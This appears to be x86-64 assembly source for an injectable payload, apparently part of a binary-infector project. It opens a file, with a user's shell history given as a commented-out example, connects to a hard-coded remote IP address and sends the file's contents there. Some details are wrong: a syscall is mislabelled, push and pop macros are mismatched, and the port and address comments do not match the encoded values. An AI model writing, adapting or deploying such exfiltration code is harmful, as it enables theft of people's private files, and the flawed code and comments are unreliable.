[BITS 64]

%macro pushx 1-*
%rep %0
	push %1
	%rotate 1
%endrep
%endmacro

%macro popx 1-*
%rep %0
	%rotate -1
	pop %1
%endrep
%endmacro

section .text
global _payload
global _payload_size

_payload:
	pushfq
	pushx rsp, rax, rdi, rsi, rdx, r10, r12, 13

	mov rax, 1	;SYS_open
	mov rdi, 1
	lea rsi, [rel msg2]
	mov rdx, 4
	syscall

	jmp open

msg db 'oui', 0x0a, 0
msg2 db 'non', 0x0a, 0

open:
    ; Ouvrir le fichier
    mov rax, 2				; SYS_open
    lea rdi, [rel path]		; Chemin du fichier
    mov rsi, 0				; O_RDONLY
    syscall
    test rax, rax
    js exit					; Gestion de l'erreur

    mov r12, rax ; Descripteur de fichier

    ; Récupérer les métadonnées du fichier
    mov rax, 4					; SYS_stat
    lea rdi, [rel path]			; Chemin du fichier
    lea rsi, [rel stat_buffer]	; Pointeur vers la structure stat
    syscall
    test rax, rax
    js error_open			; Gestion de l'erreur

    ; Créer la socket
    mov rax, 41				; SYS_socket
    mov rdi, 2				; AF_INET
    mov rsi, 1				; SOCK_STREAM
    mov rdx, 0
    syscall
    test rax, rax
    js error_open			; Gestion de l'erreur

	; Sauvegarder le descripteur de socket
    mov r13, rax ; Descripteur de socket

    ; Connecter au serveur
    mov rax, 42					; SYS_connect
    mov rdi, r13				; Descripteur de socket
    lea rsi, [rel sockaddr_in]	; Pointeur vers sockaddr_in
    mov rdx, 16					; Taille de sockaddr_in
    syscall
    test rax, rax
    js error_socket				; Gestion de l'erreur

	; Send the file
	mov rax, 40						; SYS_sendfile
	mov rdi, r13					; socket file descriptor
	mov rsi, r12					; file descriptor
	xor rdx, rdx					; offset (NULL)
	mov r10, [rel stat_buffer + 48]	; size
	syscall
    test rax, rax
    js error_socket					; Gestion de l'erreur

error_socket:
    ; Gestion de l'erreur
	; Fermer la socket
    mov rax, 3 ; SYS_close
    mov rdi, r13
    syscall

error_open:
    ; Gestion de l'erreur
	; Fermer le fichier
    mov rax, 3 ; SYS_close
    mov rdi, r12
	syscall

exit:
    ; Jump to the next instruction
	pushx rsp, rax, rdi, rsi, rdx, r10, r12, 13
	popfq
	jmp 0x0

; section .data
stat_buffer	times 144 db 0	; Taille de struct stat sur x86-64
sockaddr_in:
	; - sin_family: 2 octets
	; - sin_port: 2 octets
	; - sin_addr: 4 octets
	; - sin_zero: 8 octets
	dw 2                       ; sin_family (AF_INET)
	dw 0x9210                  ; sin_port (3002 en hex)
	dd 0x3fcbd755              ; sin_addr (INADDR_ANY)
	times 8 db 0               ; sin_zero (8 octets de zéros)
	; Taille totale: 16 octets
path		times 1024 db 0	; Chemin du fichier
; path		db '/home/maxence/.zsh_history', 0	; Chemin du fichier
_payload_size dq $- _payload